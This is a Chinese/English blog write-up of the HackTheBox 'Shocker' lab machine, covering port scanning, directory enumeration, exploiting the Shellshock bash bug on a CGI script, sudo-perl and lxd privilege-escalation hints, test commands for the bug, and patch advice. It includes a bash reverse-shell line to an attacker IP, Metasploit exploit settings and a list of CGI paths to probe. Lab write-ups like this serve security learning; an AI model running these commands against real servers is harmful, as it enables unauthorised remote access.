@@ -1,0 +1,751 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Entry pointnmap1234567891011121314$ nmap -p- -sC -sV  -Pn 10.10.10.56 -oA allportNmap scan report for 10.10.10.56Host is up (0.0037s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSIO">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox笔记：Shocker">
+<meta property="og:url" content="http://unc1e.com/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/index.html">
+<meta property="og:site_name" content="Unc1e的博客">
+<meta property="og:description" content="Entry pointnmap1234567891011121314$ nmap -p- -sC -sV  -Pn 10.10.10.56 -oA allportNmap scan report for 10.10.10.56Host is up (0.0037s latency).Not shown: 65533 closed portsPORT     STATE SERVICE VERSIO">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200707234227.png&originHeight=230&originWidth=1916&size=18242&status=done&style=none&width=1916">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png#align=left&display=inline&height=826&margin=%5Bobject%20Object%5D&name=exp.png&originHeight=826&originWidth=1445&size=147075&status=done&style=none&width=1445">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=395&size=0&status=done&style=none&width=395">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=89&originWidth=811&size=10652&status=done&style=none&width=811">
+<meta property="article:published_time" content="2020-07-04T16:45:31.000Z">
+<meta property="article:modified_time" content="2020-07-16T02:35:51.425Z">
+<meta property="article:author" content="Unc1e">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://unc1e.com/2020/07/05/yuque/HackTheBox笔记：Shocker/"/>
+
+
+
+
+
+  <title>HackTheBox笔记：Shocker | Unc1e的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Unc1e的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://unc1e.com/2020/07/05/yuque/HackTheBox%E7%AC%94%E8%AE%B0%EF%BC%9AShocker/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Unc1e">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Unc1e的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HackTheBox笔记：Shocker</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-07-05T00:45:31+08:00">
+                2020-07-05
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Entry-point"><a href="#Entry-point" class="headerlink" title="Entry point"></a>Entry point</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> nmap <span class="literal">-p</span>- <span class="literal">-sC</span> <span class="literal">-sV</span>  <span class="literal">-Pn</span> <span class="number">10.10</span>.<span class="number">10.56</span> <span class="literal">-oA</span> allport</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">10.10</span>.<span class="number">10.56</span></span><br><span class="line">Host is up (<span class="number">0.0037</span>s latency).</span><br><span class="line">Not shown: <span class="number">65533</span> closed ports</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span>/tcp   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">18</span> ((Ubuntu))</span><br><span class="line">|_http<span class="literal">-server</span><span class="literal">-header</span>: Apache/<span class="number">2.4</span>.<span class="number">18</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">'t have a title (text/html).</span></span><br><span class="line"><span class="string">2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)</span></span><br><span class="line"><span class="string">| ssh-hostkey:</span></span><br><span class="line"><span class="string">|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)</span></span><br><span class="line"><span class="string">|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)</span></span><br><span class="line"><span class="string">|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br></pre></td></tr></table></figure>
+
+<p>hydra to brute SSH using fastrack.txt, nothing to gain.</p>
+<h2 id="cgi-bin"><a href="#cgi-bin" class="headerlink" title="/cgi-bin/"></a>/cgi-bin/</h2><p>using <code>binwalk</code> and <code>file</code>, got nothing special<br><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg#align=left&display=inline&height=210&margin=%5Bobject%20Object%5D&name=bug.jpg&originHeight=420&originWidth=820&size=36861&status=done&style=none&width=410" alt="bug.jpg"><br>dir searching</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http://10.10.10.56/ -e \*</span><br><span class="line"></span><br><span class="line"><span class="emphasis">_|. _</span> \<span class="emphasis">_ \_</span> \<span class="emphasis">_ \_</span> <span class="emphasis">_|_</span> v0.3.9</span><br><span class="line">(<span class="emphasis">_||| _</span>) (/<span class="emphasis">_(_</span>|| (\_| )</span><br><span class="line"></span><br><span class="line">Extensions: | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564</span><br><span class="line"></span><br><span class="line">Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.56/</span><br><span class="line"></span><br><span class="line">Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16</span><br><span class="line"></span><br><span class="line">[23:26:16] Starting:</span><br><span class="line">[23:28:27] 403 - 299B - /.htaccess-dev</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-local</span><br><span class="line">[23:28:27] 403 - 301B - /.htaccess-marco</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessBAK</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.txt</span><br><span class="line">[23:28:28] 403 - 302B - /.htaccess.sample</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccess.old</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.orig</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.save</span><br><span class="line">[23:28:28] 403 - 300B - /.htaccess.bak1</span><br><span class="line">[23:28:28] 403 - 298B - /.htaccessOLD</span><br><span class="line">[23:28:28] 403 - 299B - /.htaccessOLD2</span><br><span class="line">[23:28:28] 403 - 299B - /.htpasswd-old</span><br><span class="line">[23:28:28] 403 - 297B - /.httr-oauth</span><br><span class="line">[23:34:58] 403 - 294B - /cgi-bin/</span><br></pre></td></tr></table></figure>
+
+<p>after obtaining these, no progress.</p>
+<h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><p>while searching for “<strong>shocker cgi-bin</strong>“, finding a open-source project named <em>shocker, see</em><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> https://github.com/nccgroup/shocker</a><br>add the ext of “<strong>.sh, .cgi</strong>“ in dirbuster,</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png#align=left&display=inline&height=230&margin=%5Bobject%20Object%5D&name=Deepin%20%E6%88%AA%E5%9C%96_select-area_20200707234227.png&originHeight=230&originWidth=1916&size=18242&status=done&style=none&width=1916" alt="Deepin 截圖_select-area_20200707234227.png"><br>also, <code>dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl</code> is supported.</p>
+<h2 id="cgi-bin-user-sh"><a href="#cgi-bin-user-sh" class="headerlink" title="/cgi/bin/user.sh"></a>/cgi/bin/user.sh</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">Just an uptime test script</span><br><span class="line"></span><br><span class="line">11:46:01 up 1:16, 0 users, load average: 0.00, 0.00, 0.00</span><br></pre></td></tr></table></figure>
+
+<p>the exp of <strong>RCE</strong> can be used at least in 2 ways<br>1st is the <em>shock</em> scirpt</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png#align=left&display=inline&height=826&margin=%5Bobject%20Object%5D&name=exp.png&originHeight=826&originWidth=1445&size=147075&status=done&style=none&width=1445" alt="exp.png"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># rce on shocker</span></span><br><span class="line"></span><br><span class="line">\$ /bin/bash -i &gt;&amp; /dev/tcp/10.10.16.122/1337 0&gt;&amp;1</span><br><span class="line">No response</span><br><span class="line"></span><br><span class="line"><span class="section"># get reverse shell</span></span><br><span class="line"></span><br><span class="line">\$ nc -lvp 1337</span><br><span class="line">listening on [any] 1337 ...</span><br><span class="line">10.10.10.56: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964</span><br><span class="line">bash: no job control in this shell</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ ls</span><br><span class="line">user.sh</span><br><span class="line"></span><br><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ id</span><br><span class="line">id</span><br><span class="line">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span><br></pre></td></tr></table></figure>
+
+<p>the 2nd is <strong>msf</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set lhost tun0</span><br><span class="line">lhost =&gt; tun0</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set rhosts 10.10.10.56</span><br><span class="line">rhosts =&gt; 10.10.10.56</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; set targeturi /cgi-bin/user.sh</span><br><span class="line">targeturi =&gt; /cgi-bin/user.sh</span><br><span class="line">msf5 exploit(multi/http/apache<span class="emphasis">_mod_</span>cgi<span class="emphasis">_bash_</span>env_exec) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.122:4444</span><br><span class="line">[*] Command Stager progress - 100.46% done (1097/1092 bytes)</span><br><span class="line">[*] Sending stage (980808 bytes) to 10.10.10.56</span><br></pre></td></tr></table></figure>
+
+<h1 id="priv-esc"><a href="#priv-esc" class="headerlink" title="priv esc"></a>priv esc</h1><h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">shelly@Shocker:/usr/lib/cgi-bin\$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for shelly on Shocker:</span><br><span class="line">env<span class="emphasis">_reset, mail_</span>badpass,</span><br><span class="line">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User shelly may run the following commands on Shocker:</span><br><span class="line">(root) NOPASSWD: /usr/bin/perl</span><br></pre></td></tr></table></figure>
+
+<h2 id="priv-esc-via-lxd"><a href="#priv-esc-via-lxd" class="headerlink" title="priv esc via lxd"></a>priv esc via lxd</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\$ cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">\$ id</span><br><span class="line">uid=1000(shelly) ... 110(lxd) ...</span><br></pre></td></tr></table></figure>
+
+<h1 id="Note-on-ShellShock"><a href="#Note-on-ShellShock" class="headerlink" title="Note on ShellShock"></a>Note on ShellShock</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg#align=left&display=inline&height=511&margin=%5Bobject%20Object%5D&originHeight=511&originWidth=395&size=0&status=done&style=none&width=395" alt=""></p>
+<blockquote>
+<p>GNU Bash 4.3 及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行 Shell 命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用 Bash Shell 之前可以用构造的值创建环境变量。这些变量可以包含代码，在 Shell 被调用后会被立即执行。<br>以下几点值得特别注意：</p>
+<ul>
+<li>这个漏洞的英文是：ShellShock，中文名被 XCERT 命名为：破壳漏洞。</li>
+<li>来自 CVSS 的评分：破壳漏洞的严重性被定义为 10 级（最高），今年 4 月爆发的 OpenSSL“心脏出血”漏洞才 5 级！</li>
+<li>破壳漏洞存在有 25 年，和 Bash 年龄一样。</li>
+</ul>
+<p>GNU Bash &lt;= 4.3，此漏洞可能会影响到</p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png#align=left&display=inline&height=89&margin=%5Bobject%20Object%5D&name=%E5%9B%BE%E7%89%87.png&originHeight=89&originWidth=811&size=10652&status=done&style=none&width=811" alt="图片.png"></p>
+<ol>
+<li>对于 HTTP 头部，CGI 脚本解析器会将其当作环境变量，调用 bash 的 env 相关函数设置到临时环境变量中；</li>
+<li>HTTP 协议允许发送任意客户端自定义的 HTTP 头部；</li>
+<li>这样就产生了一个完整的可供 Bash 命令注入的场景，客户端故意发送构造好的带攻击命令的 HTTP 头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。</li>
+</ol>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Shellshock 的原理是利用了 Bash 在导入环境变量函数时候的漏洞，启动 Bash 的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些 CGI 脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用 Shellshock 漏洞的机会。<br>目前的 bash 使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“<code>(){</code>”开头定义的环境变量在命令 ENV 中解析成函数后，Bash 执行并未退出，而是继续解析并执行 shell 命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。<br>Apache 服务器中使用<code>mod_cgi</code>（不包括<code>mod_php</code>或<code>mod_python</code>）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>可以使用如下命令来检查系统是否存在此漏洞（在本机 Bash 环境下运行）：<br><strong>破壳 1，CVE-2014-6271</strong>，测试方法：<br><code>env x=&#39;() { :;}; echo vulnerable&#39; bash -c &quot;echo this is a test&quot;</code><br>如执行结果如下表明有漏洞：<code>vulnerable, this is a test</code></p>
+<hr>
+<p><strong>破壳 2，CVE-2014-7169，</strong>测试方法：<br><code>env -i X=&#39;() { (a)=&gt;\&#39; bash -c &#39;echo date&#39;; cat echo</code><br>如执行结果如下则仍然存在漏洞：<br><code>bash: X: line 1: syntax error near unexpected token =&#39;bash: X: line 1: &#39;bash: error importing function definition for</code>X’Wed Sep 24 14:12:49 PDT 2014`<br>…</p>
+<h2 id="Fuzzing-列表"><a href="#Fuzzing-列表" class="headerlink" title="Fuzzing 列表"></a>Fuzzing 列表</h2><p>经过 ZoomEye 的 Fuzzing 探测，Fuzzing 列表如下：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/load.cgi</span><br><span class="line">/cgi-bin/gsweb.cgi</span><br><span class="line">/cgi-bin/redirector.cgi</span><br><span class="line">/cgi-bin/test.cgi</span><br><span class="line">/cgi-bin/index.cgi</span><br><span class="line">/cgi-bin/help.cgi</span><br><span class="line">/cgi-bin/about.cgi</span><br><span class="line">/cgi-bin/vidredirect.cgi</span><br><span class="line">/cgi-bin/click.cgi</span><br><span class="line">/cgi-bin/details.cgi</span><br><span class="line">/cgi-bin/log.cgi</span><br><span class="line">/cgi-bin/viewcontent.cgi</span><br><span class="line">/cgi-bin/content.cgi</span><br><span class="line">/cgi-bin/admin.cgi</span><br><span class="line">/cgi-bin/webmail.cgi</span><br></pre></td></tr></table></figure>
+
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>现在可以按照下面方式进行 Bash 的升级修复：</p>
+<table>
+<thead>
+<tr>
+<th>操作系统</th>
+<th>升级方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Ubuntu/Debian</td>
+<td>apt-get update</td>
+</tr>
+<tr>
+<td>apt-get install bash</td>
+<td></td>
+</tr>
+<tr>
+<td>RedHat/CentOS/Fedora</td>
+<td>yum update -y bash</td>
+</tr>
+<tr>
+<td>Arch Linux</td>
+<td>pacman -Syu</td>
+</tr>
+<tr>
+<td>OS X</td>
+<td>brew update</td>
+</tr>
+</tbody></table>
+<p>brew install bash<br>sudo sh -c ‘echo “/usr/local/bin/bash” &gt;&gt; /etc/shells’<br>chsh -s /usr/local/bin/bash<br>sudo mv /bin/bash /bin/bash-backup<br>sudo ln -s /usr/local/bin/bash /bin/bash |<br>| MacPorts | sudo port self update<br>sudo port upgrade bash |</p>
+<p>建议升级后按上面的方法诊断是否补丁完全。</p>
+<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>威胁经常在人们不期望它们到来的时候到来，也许是无心的雪崩，也许是有意的蓄谋。“病毒不会在星期天休息”这是安天新员工培训时必须传递的一句话，我们从柏松那里听到过这句话，我们也把这句话讲给过安天的新人。我们也许会在一瞬间被威胁打的措手不及，但不会有威胁能长久的逃逸出我们的感知和分析。<br>谨把我们的工作献给我们家人、我们的战友和我们的祖国</p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><ul>
+<li><a href="https://www.anquanke.com/post/id/179407" target="_blank" rel="noopener">https://www.anquanke.com/post/id/179407</a></li>
+<li><a href="https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd" target="_blank" rel="noopener">https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd</a></li>
+<li><a href="https://www.jianshu.com/p/66f74282a299" target="_blank" rel="noopener">Shocker</a></li>
+<li><a href="https://github.com/nccgroup/shocker" target="_blank" rel="noopener"> nccgroup / shocker </a></li>
+<li><a href="https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/</a></li>
+<li><a href="https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/" target="_blank" rel="noopener">https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/</a></li>
+<li><a href="https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt" target="_blank" rel="noopener">https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt</a></li>
+<li><a href="https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html" target="_blank" rel="noopener">https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html</a></li>
+<li><a href="https://blog.csdn.net/weixin_33709219/article/details/87981615" target="_blank" rel="noopener">https://blog.csdn.net/weixin_33709219/article/details/87981615</a></li>
+<li><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></li>
+<li><a href="https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html" target="_blank" rel="noopener">https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html</a></li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/06/27/yuque/HackTheBox%EF%BC%9AActive%E7%AC%94%E8%AE%B0/" rel="next" title="HackTheBox：Active笔记">
+                <i class="fa fa-chevron-left"></i> HackTheBox：Active笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
